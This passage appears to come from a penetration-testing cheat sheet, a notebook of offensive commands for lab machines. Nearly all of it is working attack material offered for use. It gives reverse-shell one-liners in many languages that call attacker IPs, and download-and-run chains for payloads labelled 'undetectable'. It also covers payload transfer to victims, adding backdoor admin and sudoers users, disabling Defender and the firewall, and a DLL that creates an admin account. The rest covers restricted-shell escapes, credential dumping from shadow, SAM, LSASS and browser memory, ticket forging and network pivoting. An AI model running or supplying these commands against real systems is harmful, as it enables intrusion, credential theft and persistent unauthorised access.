python -c '__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.9 4433 &gt;/tmp/f')-1\'

# Python IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 

# Ruby
ruby -rsocket -e'f=TCPSocket.open("IP ADDRESS",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# PHP:
# /usr/share/webshells/php/php-reverse-shell.php
# http://pentestmonkey.net/tools/web-shells/php-reverse-shell
php -r '$sock=fsockopen("IP ADDRESS",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes);?&gt;

# Golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP ADDRESS:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go

# AWK
awk 'BEGIN {s = "/inet/tcp/0/IP ADDRESS/4242"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}' /dev/null

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

# Socat
socat TCP4:10.10.10.10:443 EXEC:/bin/bash
# Socat listener
socat -d -d TCP4-LISTEN:443 STDOUT
</code></pre>
<h2 id="windows"><a class="header" href="#windows">Windows</a></h2>
<pre><code class="language-text"># Netcat
nc -e cmd.exe 10.11.1.111 4443

# Powershell
$callback = New-Object System.Net.Sockets.TCPClient("IP ADDRESS",53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Undetectable:
# https://0xdarkvortex.dev/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/
i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

# Undetectable 2:
# https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
# 64bit:
powershell -command "&amp; { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" &amp;&amp; powershell -command "&amp; { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" &amp;&amp; C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
# 32bit:
powershell -command "&amp; { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" &amp;&amp; powershell -command "&amp; { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" &amp;&amp; C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
</code></pre>
<h2 id="tips-1"><a class="header" href="#tips-1">Tips</a></h2>
<pre><code class="language-text">#  rlwrap
# https://linux.die.net/man/1/rlwrap
# Connect to a netcat client:
rlwrap nc [IP Address] [port]
# Connect to a netcat Listener:
rlwrap nc -lvp [Localport]

# Linux Backdoor Shells: 
rlwrap nc [Your IP Address] -e /bin/sh 
rlwrap nc [Your IP Address] -e /bin/bash
rlwrap nc [Your IP Address] -e /bin/zsh
rlwrap nc [Your IP Address] -e /bin/ash

# Windows Backdoor Shell: 
rlwrap nc -lv [localport] -e cmd.exe
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="file-transfer"><a class="header" href="#file-transfer">File transfer</a></h1>
<h2 id="linux-1"><a class="header" href="#linux-1">Linux</a></h2>
<pre><code class="language-text"># Web Server
# https://github.com/sc0tfree/updog
pip3 install updog
updog 
updog -d /another/directory
updog -p 1234
updog --password examplePassword123!
updog --ssl

# Python web server
python -m SimpleHTTPServer 8080

# FTP Server
twistd -n ftp -p 21 --root /path/
# In victim: 
curl -T out.txt ftp://10.10.15.229

# TFTP Server
# In Kali
atftpd --daemon --port 69 /tftp
# In reverse Windows
tftp -i 10.11.1.111 GET nc.exe
nc.exe -e cmd.exe 10.11.1.111 4444
# Example:
http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&amp;cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444
</code></pre>
<h2 id="windows-1"><a class="header" href="#windows-1">Windows</a></h2>
<pre><code class="language-text"># Bitsadmin
bitsadmin /transfer mydownloadjob /download /priority normal http:///xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe

# certutil
certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.bat

# Powershell
(New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
invoke-webrequest -Uri http://10.10.14.19:9090/PowerUp.ps1 -OutFile powerup.ps1

# FTP
# In reverse shell" 
echo open 10.11.1.111 &gt; ftp.txt)
echo USER anonymous &gt;&gt; ftp.txt
echo ftp &gt;&gt; ftp.txt 
echo bin &gt;&gt; ftp.txt
echo GET file &gt;&gt; ftp.txt
echo bye &gt;&gt; ftp.txt
# Execute
ftp -v -n -s:ftp.txt

# SMB Server
# Attack machine
python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111" -u usuario -p pass
python /usr/share/doc/python3-impacket/examples/smbserver.py Lab "/root/htb/169-resolute/smb"

# Or SMB service 
# http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
    vim /etc/samba/smb.conf
        [global]
        workgroup = WORKGROUP
        server string = Samba Server %v
        netbios name = indishell-lab
        security = user
        map to guest = bad user
        name resolve order = bcast host
        dns proxy = no
        bind interfaces only = yes

        [ica]
        path = /var/www/html/pub
        writable = no
        guest ok = yes
        guest only = yes
        read only = yes
        directory mode = 0555
        force user = nobody

    chmod -R 777 smb_path
    chown -R nobody:nobody smb_path
    service smbd restart 

# Victim machine with reverse shell
# Download: copy \\10.11.1.111\Lab\wce.exe . 
# Upload: copy wtf.jpg \\10.11.1.111\Lab

# VBScript
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
echo Err.Clear &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget.vbs
echo http.Open "GET",strURL,False &gt;&gt; wget.vbs
echo http.Send &gt;&gt; wget.vbs
echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
echo strData = "" &gt;&gt; wget.vbs
echo strBuffer = "" &gt;&gt; wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
echo Next &gt;&gt; wget.vbs
echo ts.Close &gt;&gt; wget.vbs
# Execute
cscript wget.vbs http://10.11.1.111/file.exe file.exe
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux-2"><a class="header" href="#linux-2">Linux</a></h1>
<h2 id="local-enum"><a class="header" href="#local-enum">Local Enum</a></h2>
<pre><code class="language-text">**Tools** 
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
https://github.com/mbahadou/postenum/blob/master/postenum.sh
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

https://gtfobins.github.io/

# Spawning shell
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within vi)
:!bash
:set shell=/bin/bash:shell
(From within nmap)
!sh

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Download files from attacker
wget http://10.11.1.111:8080/ -r; mv 10.11.1.111:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linpeas.sh postenum.sh pspy32 pspy64

# Enum scripts
./LinEnum.sh -t -k password -r LinEnum.txt
./postenum.sh
./linpeas.sh
./pspy

# Common writable directories
/tmp
/var/tmp
/dev/shm

# Add user to sudoers
useradd hacker
passwd hacker
echo "hacker ALL=(ALL:ALL) ALL" &gt;&gt; /etc/sudoers

# sudo permissions
sudo -l -l

# Journalctl
If you can run as root, run in small window and !/bin/sh

# Crons
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
cat /etc/frontal
cat /etc/anacron
systemctl list-timers --all

# Common info
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE "nologin" /etc/passwd

# Network info
cat /proc/net/arp
cat /proc/net/fib_trie
cat /proc/net/fib_trie | grep "|--"   | egrep -v "0.0.0.0| 127."
awk '/32 host/ { print f } {f=$2}' &lt;&lt;&lt; "$(0; i-=2) {
        ret = ret"."hextodec(substr(str,i,2))
    }
    ret = ret":"hextodec(substr(str,index(str,":")+1,4))
    return ret
} 
NR &gt; 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}' /proc/net/tcp

# Netstat without netstat 2
echo "YXdrICdmdW5jdGlvbiBoZXh0b2RlYyhzdHIscmV0LG4saSxrLGMpewogICAgcmV0ID0gMAogICAgbiA9IGxlbmd0aChzdHIpCiAgICBmb3IgKGkgPSAxOyBpIDw9IG47IGkrKykgewogICAgICAgIGMgPSB0b2xvd2VyKHN1YnN0cihzdHIsIGksIDEpKQogICAgICAgIGsgPSBpbmRleCgiMTIzNDU2Nzg5YWJjZGVmIiwgYykKICAgICAgICByZXQgPSByZXQgKiAxNiArIGsKICAgIH0KICAgIHJldHVybiByZXQKfQpmdW5jdGlvbiBnZXRJUChzdHIscmV0KXsKICAgIHJldD1oZXh0b2RlYyhzdWJzdHIoc3RyLGluZGV4KHN0ciwiOiIpLTIsMikpOyAKICAgIGZvciAoaT01OyBpPjA7IGktPTIpIHsKICAgICAgICByZXQgPSByZXQiLiJoZXh0b2RlYyhzdWJzdHIoc3RyLGksMikpCiAgICB9CiAgICByZXQgPSByZXQiOiJoZXh0b2RlYyhzdWJzdHIoc3RyLGluZGV4KHN0ciwiOiIpKzEsNCkpCiAgICByZXR1cm4gcmV0Cn0gCk5SID4gMSB7e2lmKE5SPT0yKXByaW50ICJMb2NhbCAtIFJlbW90ZSI7bG9jYWw9Z2V0SVAoJDIpO3JlbW90ZT1nZXRJUCgkMyl9e3ByaW50IGxvY2FsIiAtICJyZW1vdGV9fScgL3Byb2MvbmV0L3RjcCAKqtc" | base64 -d | sh

# Nmap without nmap
for ip in {1..5}; do for port in {21,22,5000,8000,3306}; do (echo &gt;/dev/tcp/172.18.0.$ip/$port) &gt;&amp; /dev/null &amp;&amp; echo "172.18.0.$ip port $port is open"; done; done

# Open ports without netstat
grep -v "rem_address" /proc/net/tcp | awk  '{x=strtonum("0x"substr($2,index($2,":")-2,2)); for (i=5; i&gt;0; i-=2) x = x"."strtonum("0x"substr($2,i,2))}{print x":"strtonum("0x"substr($2,index($2,":")+1,4))}'

# Check ssh files:
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key

# SUID
find / -perm -4000 -type f 2&gt;/dev/null
# ALL PERMS
find / -perm -777 -type f 2&gt;/dev/null
# SUID for current user
find / perm /u=s -user `whoami` 2&gt;/dev/null
find / -user root -perm -4000 -print 2&gt;/dev/null
# Writables for current user/group
find / perm /u=w -user `whoami` 2&gt;/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2&gt;/dev/null
find / -perm /u+w -user `whoami` 2&gt;/dev/nul
# Dirs with +w perms for current u/g
find / perm /u=w -type -d -user `whoami` 2&gt;/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2&gt;/dev/null

# Port Forwarding
# Chisel
# Victim server:
chisel server --auth "test:123" -p 443 --reverse
# In host attacker machine:
./chisel client --auth "test:123" 10.10.10.10:443 R:socks

# Dynamic Port Forwarding:
# Attacker machine:
ssh -D 9050 user@host
# Attacker machine Burp Proxy - SOCKS Proxy:
Mark “Override User Options”
Mark Use Socks Proxy:
SOCKS host:127.0.0.1
SOCKS port:9050

# Tunneling 
Target must have SSH running for there service
1. Create SSH Tunnel: ssh -D localhost: -f -N user@localhost -p 
2. Setup ProxyChains. Edit the following config file (/etc/proxychains.conf)
3. Add the following line into the config: Socks5 127.0.0.1 
4. Run commands through the tunnel: proxychains 

# SShuttle
# https://github.com/sshuttle/sshuttle
sshuttle -r root@172.21.0.0 10.2.2.0/24

# netsh port forwarding
netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=9000 connectaddress=192.168.0.10 connectport=80
netsh interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=9000
</code></pre>
<h2 id="escaping-restricted-shell"><a class="header" href="#escaping-restricted-shell">Escaping restricted shell</a></h2>
<pre><code class="language-text"># First check your shell
echo $SHELL
# and commands
export

# vim
# List files
:!/bin/ls -l .b*
# Set new shell
:set shell=/bin/sh
:shell
# or
:!/bin/sh

# ed
!'/bin/sh'

# ne -&gt; Load Prefs -&gt; Navigate everywhere

# more/less/man/pinfo
!'sh'

# links -&gt; File OS Shell
# lynx -&gt; "o" for options -&gt; configure default editor e.g. vim
lynx --editor=/usr/bin/vim www.google.com
# or
export EDITOR=/usr/bin/vim
# navigate to https://translate.google.com/ go to text box, ENTER and F4

# mutt
!

# find 
find / -name "root" -exec /bin/sh \;
find / -name "root" -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# nmap &lt; 2009/05
--interactive
!sh

# awk
awk 'BEGIN {system("/bin/sh")}'

# expect
expect -c 'spawn sh' -i

# python
python -c 'import pty; pty.spawn("/bin/sh")'

# ruby irb
exec '/bin/sh'

# perl
perl -e 'system("sh -i");'
perl -e 'exec("sh -i");'

# php -a
exec("sh -i");

# Only Rbash
echo x | xargs -Iy sh -c 'exec sh 0&lt;&amp;1'

# Emacs
Mod-!
/bin/sh

# cp
cp /bin/sh /dev/shm/sh; /dev/shm/sh

# export
export SHELL=/bin/sh; export PATH=/bin:/usr/bin:$PATH

# FTP/Telnet
!/bin/sh

# GDB
!/bin/sh

# eval
eval echo echo {o..q}ython\;

# tee
echo '/bin/rm /home/user/.bashrc' | tee '/home/user/bin/win';win; echo 'export SHELL=/bin/sh' | tee '/home/user/.bashrc'

# declare
declare -n PATH; export PATH=/bin;bash -i
BASH_CMDS[shell]=/bin/bash;shell -i

# nano
nano -s /bin/sh
# Ctrl+T

# SSH
ssh user@host -t "bash --noprofile -i"
ssh user@host -t "() { :; }; sh -i "
</code></pre>
<h2 id="loot"><a class="header" href="#loot">Loot</a></h2>
<pre><code class="language-text"># Linux
cat /etc/passwd
cat /etc/shadow
unshadow passwd shadow &gt; unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

ifconfig -a
arp -a

tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111

.bash_history

/var/mail
/var/spool/mail

echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pivoting"><a class="header" href="#pivoting">Pivoting</a></h1>
<p>https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019</p>
<pre><code># SSH local port forwarding
ssh user@ssh_server -L [bind_address:]local_port:destination_host:destination_hostport
ssh noraj@192.168.2.105 -L 127.0.0.1:32000:10.42.42.2:80 -N


# SSH reverse remote port forwarding
ssh user@ssh_server -R [bind_address:]remote_port:destination_host:destination_hostport
ssh noraj@192.168.2.105 -R 192.168.2.105:15000:127.0.0.1:9999

# SSH dynamic port forwarding
ssh user@ssh_server -D [bind_address:]local_port
ssh noraj@192.168.2.105 -D 127.0.0.1:12000 -N

# SSHUTTLE
# You can tunnel via ssh all the traffic to a subnetwork through a host.
# Example, forwarding all the traffic going to 10.0.0.1/24
pip install sshuttle
sshuttle -r user@host 10.0.0.1/24

# MSF
meterpreter &gt; portfwd add -l 80 -r 172.16.0.0 -p 80

# Netcat
nc -l -p &lt; port to listen on&gt; 0&lt;pivot | nc 1&gt;pivot
# Ncat Http Proxy
ncat -vv --listen 3128 --proxy-type http

# Local Port2Port
#Local port 1521 accessible in port 10521 from everywhere
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1
#Remote port 1521 accessible in port 10521 from everywhere 
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 

# Port2hostnet (proxychains)
# Local Port --&gt; Compromised host(SSH) --&gt; Wherever
ssh -f -N -D &lt;attacker_port&gt; &lt;username&gt;@&lt;ip_compromised&gt;

# Remote Port Forwarding
ssh -N -R 10.10.1.1:4455:127.0.0.1:445 attacker@10.10.1.1
# Socks5 with SSH
ssh -N -D 127.0.0.1:8888 admin@10.1.1.1

#SSH Dynamic Port Forwarding
ssh -N -D 127.0.0.1:1337 user@remotehost -p 8888

# SSH graphical connection (X)
ssh -Y -C &lt;user&gt;@&lt;ip&gt; 
# &lt;-Y is less secure but faster than -X&gt;

# HTTP tunnel
# Port forwarding
chisel server -p 8080 --host 192.168.2.105 -v
chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:10.42.42.2:80
# Reverse remote port forwarding
chisel server -p 8888 --host 192.168.2.149 --reverse -v
chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:10.42.42.2:80
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-2"><a class="header" href="#windows-2">Windows</a></h1>
<h2 id="local-enum-1"><a class="header" href="#local-enum-1">Local enum</a></h2>
<pre><code class="language-bash"># Tools 
https://github.com/S3cur3Th1sSh1t/WinPwn
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat
https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/privesc/PowerUp.ps1
https://github.com/S3cur3Th1sSh1t/PowerSharpPack
https://github.com/Flangvik/SharpCollection
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
https://github.com/dafthack/DomainPasswordSpray
https://github.com/CredDefense/CredDefense
https://github.com/dafthack/MailSniper
https://github.com/itm4n/PrivescCheck

https://lolbas-project.github.io/#

# Basic info
systeminfo
set
Get-ChildItem Env: | ft Key,Value
hostname
net users
net user user1
query user
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
net use
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *
netsh firewall show state
netsh firewall show config
whoami /priv
echo %USERNAME%
$env:UserName
wmic qfe
qwinsta
query user
net localgroup
Get-LocalGroup | ft Name

# Set path
set PATH=%PATH%;C:\xampp\php

dir /a -&gt; Show hidden &amp; unhidden files
dir /Q -&gt; Show permissions

# check .net version:
gci 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | gp -name Version -EA 0 | where { $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "Users Path"

# Passwords
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
python secretsdump.py -just-dc-ntlm htb.hostname/username@10.10.1.10 
secretsdump.py -just-dc htb.hostname/username@10.10.1.10 &gt; dump.txt

# Add RDP user and disable firewall
net user test Test123! /add
net localgroup Administrators test /add
net localgroup "Remote Desktop Users" test /ADD
# Turn firewall off and enable RDP
sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Dump Firefox data
# Looking for Firefox
Get-Process
./procdump64.exe -ma $PID-FF
Select-String -Path .\*.dmp -Pattern 'password' &gt; 1.txt
type 1.txt | findstr /s /i "admin"

# PS Bypass Policy 
Set-ExecutionPolicy Unrestricted
powershell.exe -exec bypass
Set-ExecutionPolicy-ExecutionPolicyBypass -Scope Procesy

# Convert passwords to secure strings and output to an XML file:
$secpasswd = ConvertTo-SecureString "VMware1!" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("administrator", $secpasswd) 
$mycreds | export-clixml -path c:\temp\password.xml

# PS sudo
$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &amp;{Start-Process $script -verb Runas}'
powershell -ExecutionPolicy -F -File xyz.ps1

# PS runas
# START PROCESS
$username='someUser'
$password='somePassword'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process .\nc.exe -ArgumentList '10.10.xx.xx 4445 -e cmd.exe' -Credential $credential
# INVOKE COMMAND
$pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential ("fidelity\hector", $pass);Invoke-Command -Computer 'Fidelity' -ScriptBlock {C:\inetpub\wwwroot\uploads\nc.exe -e cmd 10.10.15.121 443} -credential $Credential

# Tasks
schtasks /query /fo LIST /v
file c:\WINDOWS\SchedLgU.Txt
python3 atexec.py Domain/Administrator:&lt;Password&gt;@123@172.21.0.0 systeminfo

# Useradd bin
#include  /* system, NULL, EXIT_FAILURE */
int main ()
{
  int i;
  i=system ("net user   /add &amp;&amp; net localgroup administrators  /add");
  return 0;
}
# Compile
i686-w64-mingw32-gcc -o useradd.exe useradd.c

# WinXP
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.1.111 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost

# WinRM Port Forwarding
plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221

# DLL Injection
#include 
int owned()
{
  WinExec("cmd.exe /c net user username Password01 ; net localgroup administrators username /add", 0);
  exit(0);
  return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
# x64 compilation:
x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

# Generate Silver Tickets with Impacket:
python3 ticketer.py -nthash &lt;ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;
python3 ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;

# Generate Golden Tickets:
python3 ticketer.py -nthash &lt;krbtgt_ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;
python3 ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;

# Credential Access with Secretsdump
impacket-secretsdump username@target-ip -dc-ip target-ip

# Disable Assembly code generator
https://amsi.fail/
</code></pre>
<h2 id="interesting-files"><a class="header" href="#interesting-files">Interesting files</a></h2>
<pre><code>C:\windows\repair\sam
C:\windows\System32\config\RegBack\SAM
C:\windows\repair\system
C:\windows\repair\software
C:\windows\repair\security
C:\windows\debug\NetSetup.log
C:\windows\iis5.log
C:\windows\iis6.log
C:\windows\iis7.log
C:\windows\system32\logfiles\httperr\httperr1.log
C:\sysprep.inf
C:\sysprep\sysprep.inf
C:\sysprep\sysprep.xml
C:\windows\Panther\Unattended.xml
C:\inetpub\wwwroot\Web.config
C:\windows\system32\config\AppEvent.Evt
C:\windows\system32\config\SecEvent.Evt
C:\windows\system32\config\default.sav
C:\windows\system32\config\security.sav
C:\windows\system32\config\software.sav
C:\windows\system32\config\system.sav
C:\windows\system32\inetsrv\config\applicationHost.config
C:\windows\system32\inetsrv\config\schema\ASPNET_schema.xml
C:\windows\System32\drivers\etc\hosts
C:\windows\System32\drivers\etc\networks
C:\windows\system32\config\SAM
</code></pre>
<h2 id="mimikatz"><a class="header" href="#mimikatz">Mimikatz</a></h2>
<pre><code># SAM
privilege::debug
token::elevate
lsadump::sam

# Windows Credential Manager
privilege::debug
sekurlsa::credman

# LSASS
privilege::debug
sekurlsa::minidump C:\Users\raj\Desktop\lsass.DMP
